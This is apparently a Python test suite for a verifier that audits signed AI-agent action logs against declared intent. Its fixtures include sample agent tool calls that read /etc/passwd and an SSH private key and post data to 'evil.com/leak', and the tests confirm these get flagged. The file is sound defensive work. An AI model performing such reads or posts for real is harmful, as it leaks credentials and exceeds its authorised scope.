"""Tests for structural verification over AgDR chains."""
from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any

from airsdk._concrete_demo import build_concrete_demo_log
from airsdk.agdr import Signer, load_chain
from airsdk.recorder import AIRRecorder
from airsdk.types import AgDRPayload, AgDRRecord, IntentSpec, StepKind
from airsdk.verification import IntentSource, IntentVerdict, verify_intent


def _build_chain(steps: list[tuple[StepKind, dict[str, Any]]]) -> list[AgDRRecord]:
    signer = Signer.generate()
    return [
        signer.sign(kind=kind, payload=AgDRPayload.model_validate(data))
        for kind, data in steps
    ]


def _demo_records() -> list[AgDRRecord]:
    with tempfile.TemporaryDirectory() as tmp:
        log_path = Path(tmp) / "demo.jsonl"
        build_concrete_demo_log(log_path)
        return load_chain(log_path)


class TestDemoChain:
    def test_demo_chain_fails_verification(self) -> None:
        records = _demo_records()
        result = verify_intent(records)
        assert result.verdict == IntentVerdict.FAILED

    def test_demo_chain_has_exfil_violation(self) -> None:
        records = _demo_records()
        result = verify_intent(records)
        exfil = [v for v in result.violations if v.check_id == "SV-EXFIL-01"]
        assert len(exfil) == 1
        assert exfil[0].causal_path == [6, 7, 8]

    def test_demo_chain_has_secret_violation(self) -> None:
        records = _demo_records()
        result = verify_intent(records)
        secrets = [v for v in result.violations if v.check_id == "SV-SECRET-01"]
        assert len(secrets) == 1
        assert secrets[0].step_index == 6

    def test_demo_chain_has_network_violation(self) -> None:
        records = _demo_records()
        result = verify_intent(records)
        net = [v for v in result.violations if v.check_id == "SV-NET-01"]
        assert len(net) == 1
        assert net[0].step_index == 8

    def test_demo_chain_intent_is_extracted(self) -> None:
        records = _demo_records()
        result = verify_intent(records)
        assert result.intent_source == IntentSource.EXTRACTED
        assert "Refactor" in result.intent


class TestBenignChain:
    def test_benign_chain_verifies(self) -> None:
        records = _build_chain([
            (StepKind.LLM_START, {"prompt": "Refactor the auth module.", "user_intent": "Refactor the auth module."}),
            (StepKind.LLM_END, {"response": "I will read the auth module."}),
            (StepKind.TOOL_START, {"tool_name": "read_file", "tool_args": {"path": "./src/auth.py"}}),
            (StepKind.TOOL_END, {"tool_output": "def login(): pass"}),
            (StepKind.TOOL_START, {"tool_name": "write_file", "tool_args": {"path": "./src/auth.py"}}),
            (StepKind.TOOL_END, {"tool_output": "ok"}),
            (StepKind.AGENT_FINISH, {"final_output": "Refactored auth module."}),
        ])
        result = verify_intent(records)
        assert result.verdict == IntentVerdict.VERIFIED
        assert result.violations == []


class TestEmptyAndNoIntent:
    def test_empty_chain_is_inconclusive(self) -> None:
        result = verify_intent([])
        assert result.verdict == IntentVerdict.INCONCLUSIVE

    def test_no_intent_is_inconclusive(self) -> None:
        records = _build_chain([
            (StepKind.LLM_START, {"prompt": "hello"}),
            (StepKind.LLM_END, {"response": "hi"}),
        ])
        result = verify_intent(records)
        assert result.verdict == IntentVerdict.INCONCLUSIVE


class TestIntentDeclaration:
    def test_recorder_emits_intent_declaration(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            log = Path(tmp) / "chain.jsonl"
            spec = IntentSpec(
                goal="Refactor the auth module",
                allowed_tools=["read_file", "write_file"],
                allowed_paths=["./src/auth/"],
            )
            recorder = AIRRecorder(log, intent_spec=spec)
            recorder.llm_start(prompt="Refactor the auth module")
            recorder.llm_end(response="OK")
            records = load_chain(log)
            assert records[0].kind == StepKind.INTENT_DECLARATION
            assert records[0].payload.intent_spec is not None
            assert records[0].payload.intent_spec.goal == "Refactor the auth module"

    def test_declaration_source_is_declaration(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            log = Path(tmp) / "chain.jsonl"
            spec = IntentSpec(
                goal="Refactor the auth module",
                allowed_tools=["read_file", "write_file"],
                allowed_paths=["./src/auth/"],
            )
            recorder = AIRRecorder(log, intent_spec=spec)
            recorder.llm_start(prompt="Refactor the auth module")
            recorder.llm_end(response="OK")
            records = load_chain(log)
            result = verify_intent(records)
            assert result.intent_source == IntentSource.DECLARATION


class TestScopeCheck:
    def test_out_of_scope_file_access(self) -> None:
        spec = IntentSpec(
            goal="Refactor auth",
            allowed_paths=["./src/auth/"],
        )
        records = _build_chain([
            (StepKind.INTENT_DECLARATION, {"intent_spec": spec, "user_intent": spec.goal}),
            (StepKind.TOOL_START, {"tool_name": "read_file", "tool_args": {"path": "/etc/passwd"}}),
            (StepKind.TOOL_END, {"tool_output": "root:x:0:0:root"}),
        ])
        result = verify_intent(records)
        scope = [v for v in result.violations if v.check_id == "SV-SCOPE-01"]
        assert len(scope) == 1

    def test_in_scope_file_no_violation(self) -> None:
        spec = IntentSpec(
            goal="Refactor auth",
            allowed_paths=["./src/auth/"],
        )
        records = _build_chain([
            (StepKind.INTENT_DECLARATION, {"intent_spec": spec, "user_intent": spec.goal}),
            (StepKind.TOOL_START, {"tool_name": "read_file", "tool_args": {"path": "./src/auth/login.py"}}),
            (StepKind.TOOL_END, {"tool_output": "def login(): pass"}),
        ])
        result = verify_intent(records)
        scope = [v for v in result.violations if v.check_id == "SV-SCOPE-01"]
        assert scope == []


class TestAllowedNetwork:
    def test_allowed_network_no_violation(self) -> None:
        spec = IntentSpec(
            goal="Fetch data from API",
            allowed_network=["api.example.com"],
        )
        records = _build_chain([
            (StepKind.INTENT_DECLARATION, {"intent_spec": spec, "user_intent": spec.goal}),
            (StepKind.TOOL_START, {"tool_name": "http_get", "tool_args": {"url": "https://api.example.com/data"}}),
            (StepKind.TOOL_END, {"tool_output": "{}"}),
        ])
        result = verify_intent(records)
        net = [v for v in result.violations if v.check_id == "SV-NET-01"]
        assert net == []

    def test_disallowed_network_violation(self) -> None:
        spec = IntentSpec(
            goal="Fetch data from API",
            allowed_network=["api.example.com"],
        )
        records = _build_chain([
            (StepKind.INTENT_DECLARATION, {"intent_spec": spec, "user_intent": spec.goal}),
            (StepKind.TOOL_START, {"tool_name": "http_post", "tool_args": {"url": "https://evil.com/leak"}}),
            (StepKind.TOOL_END, {"tool_output": "ok"}),
        ])
        result = verify_intent(records)
        net = [v for v in result.violations if v.check_id == "SV-NET-01"]
        assert len(net) == 1


class TestSecretAccess:
    def test_declared_secret_access_no_violation(self) -> None:
        spec = IntentSpec(
            goal="Rotate SSH keys",
            secret_access=True,
        )
        records = _build_chain([
            (StepKind.INTENT_DECLARATION, {"intent_spec": spec, "user_intent": spec.goal}),
            (StepKind.TOOL_START, {"tool_name": "read_file", "tool_args": {"path": "/home/dev/.ssh/id_rsa"}}),
            (StepKind.TOOL_END, {"tool_output": "-----BEGIN OPENSSH PRIVATE KEY-----\nfoo\n-----END OPENSSH PRIVATE KEY-----"}),
        ])
        result = verify_intent(records)
        secrets = [v for v in result.violations if "SECRET" in v.check_id]
        assert secrets == []
